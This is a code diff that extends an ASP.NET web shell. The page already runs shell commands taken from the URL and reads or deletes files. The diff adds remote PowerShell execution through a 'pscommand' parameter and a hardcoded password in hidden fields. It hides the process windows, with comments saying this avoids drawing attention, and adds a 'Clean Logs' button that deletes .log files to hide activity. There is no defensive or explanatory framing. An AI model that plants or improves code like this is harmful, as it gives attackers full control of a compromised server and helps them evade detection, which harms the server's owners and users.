@@ -9,6 +9,8 @@
         {
             string lastCommand = Request["execute"] ?? ""; // احفظ آخر أمر مدخل
             string filePathCommand = Request["filepath"] ?? ""; // مسار الملف المطلوب
+            string psCommand = Request["pscommand"] ?? ""; // PowerShell command
+            string action = Request["action"];
 
             Response.Write(@"
                 <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #111; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.7); color: #0f0;'>
@@ -25,8 +27,18 @@
                         <input type='submit' name='action' value='Read File' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
                         <input type='submit' name='action' value='Delete File' style='margin-left: 10px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #f00; color: #fff; font-size: 16px; cursor: pointer;' />
                     </form>
+                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
+                        <label for='psCommandInput' style='margin-right: 10px; font-weight: bold;'>PowerShell Command:</label>
+                        <input type='text' id='psCommandInput' name='pscommand' style='flex: 1; padding: 10px; border: 1px solid #444; border-radius: 5px; background-color: #222; color: #0f0; font-size: 16px;' value='" + Server.HtmlEncode(psCommand) + @"' />
+                        <input type='hidden' name='password' value='28112016' />
+                        <input type='submit' value='Execute PowerShell' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
+                    </form>
+                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
+                        <input type='hidden' name='password' value='28112016' />
+                        <input type='submit' name='action' value='Clean Logs' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
+                    </form>
                 </div>
-                <div style='margin-top: 160px; padding: 20px;'>
+                <div style='margin-top: 220px; padding: 20px;'>
             ");
 
             if (!string.IsNullOrEmpty(lastCommand))
@@ -40,6 +52,36 @@
                     psi.RedirectStandardError = true;
                     psi.UseShellExecute = false;
                     psi.CreateNoWindow = true;
+                    psi.WindowStyle = ProcessWindowStyle.Hidden; // Hide the process window to avoid drawing attention
+
+                    Process process = Process.Start(psi);
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(output) + "</pre>");
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(error) + "</pre>");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                }
+            }
+
+            if (!string.IsNullOrEmpty(psCommand))
+            {
+                try
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo();
+                    psi.FileName = "powershell.exe";
+                    psi.Arguments = "-Command " + psCommand;
+                    psi.RedirectStandardOutput = true;
+                    psi.RedirectStandardError = true;
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
+                    psi.WindowStyle = ProcessWindowStyle.Hidden; // Hide the process window to avoid drawing attention
 
                     Process process = Process.Start(psi);
                     string output = process.StandardOutput.ReadToEnd();
@@ -59,7 +101,6 @@
 
             if (!string.IsNullOrEmpty(filePathCommand))
             {
-                string action = Request["action"];
                 if (action == "Read File")
                 {
                     try
@@ -97,6 +138,27 @@
                     {
                         Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                     }
+                }
+            }
+
+            if (action == "Clean Logs")
+            {
+                try
+                {
+                    string logDir = Path.GetTempPath();
+                    DirectoryInfo di = new DirectoryInfo(logDir);
+                    foreach (FileInfo file in di.GetFiles())
+                    {
+                        if (file.Extension == ".log")
+                        {
+                            file.Delete();
+                        }
+                    }
+                    Response.Write("<pre style='color: lime; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>Logs cleaned successfully.</pre>");
+                }
+                catch (Exception ex)
+                {
+                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                 }
             }
 
